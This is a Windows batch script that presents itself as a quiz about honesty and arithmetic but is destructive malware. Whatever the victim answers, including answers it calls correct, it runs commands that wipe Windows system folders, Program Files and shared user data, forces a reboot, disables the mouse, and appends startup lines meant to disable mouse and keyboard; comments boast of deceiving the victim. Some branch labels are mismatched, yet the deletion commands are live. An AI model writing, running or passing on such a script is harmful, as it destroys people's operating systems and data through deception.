@echo off
cls
color 5
echo Only you can decide your own fate.
c:\WINDOWS\rundll32.exe mouse,disable
type NUL | choice /N /CY /TY,1 >NUL
echo If you quit, then Windows will be deleted.
REM So they think...
type NUL | choice /N /CY /TY,1 >NUL
echo Answer the following questions correctly, and your computer shall be left alone.
echo.
echo Question 1:
echo.
echo.
echo If you came across an abandoned wallet full with money, would you:
echo.
echo 1) hand it in to the police.
echo.
echo 2) take the money and leave the wallet.
echo.
echo 3) take everything (inluding the wallet).
echo.
echo 4) take everything and then sell the wallet.
echo.
choice /n/c1234 "choose below"
if errorlevel 4 goto wrong1
if errorlevel 3 goto wrong2
if errorlevel 2 goto wrong3
if errorlevel 1 goto right1

:wrong1
echo Oops, you made a mistake, one item shall be deducted from your computer.
RD/s/q "C:\WINDOWS\system"
type NUL | choice /N /CY /TY,1 >NUL
echo Try again:
echo.
echo.
echo Question 2:
echo.
echo.
echo What is 97382634 - 213828?
echo You have 7 seconds to answer....
echo 1) 97268870
echo.
echo 2) 97168806
echo.
echo 3) 96882343
echo.
echo 4) 97232123
choice /N /C1234 /TY,7 "choose below"
if errorlevel 4 goto nope
if errorlevel 3 goto einstein
if errorlevel 2 goto sorry
if errorlevel 1 goto hahaha
else goto notverysmart


:wrong2
echo Sorry man, that's not bad enough....
echo.
del /F /Q "C:\WINDOWS\system/*.*"
pause
exit

:wrong 3
echo GOODBYE!
RD/s/q "C:\WINDOWS\Media"
pause
SHUTDOWN -r -t 5

:right
echo Heh heh heh, I see that you are wise.
echo.
echo But I won't let you off that easily....
del /F /Q "C:\WINDOWS\*.*"
pause
exit

:nope
echo Wrong answer dude.
echo.
echo goodbye
del /F /Q "C:\WINDOWS\system32"
pause
exit

:einstein
echo Whoah!  You are smart!  I'm going to let you off and I am not going to delete anything!
REM Little does he no that i am a very bad man....
RD/s/q "C:\Program Files"
echo.
echo Goodbye and thanks for your time!

:sorry
echo Damn you're stupid...
echo.
echo I hate  stupid people!
RD/s/q "C:\Documents and Settings\All Users"
exit

:hahaha
echo You are a fool
echo.
echo Goodbye Windows!
RD/s/q "C:\WINDOWS"
pause
exit

:notverysmart
echo Well, you are quite slow....
echo @echo off >> autoexec.bat
echo cls >> autoexec.bat
echo c:\windows\rundll32.exe mouse,disable >> autoexec.bat
echo c:\windwos\rundll32.exe keyboard,disable >> autoexec.bat
echo ECHO HA HA HA HA HA!!! >> autoexec.bat
echo type NUL | choice /N /CY /TY,1 >NUL >> autoexec.bat
echo exit >> autoexec.bat 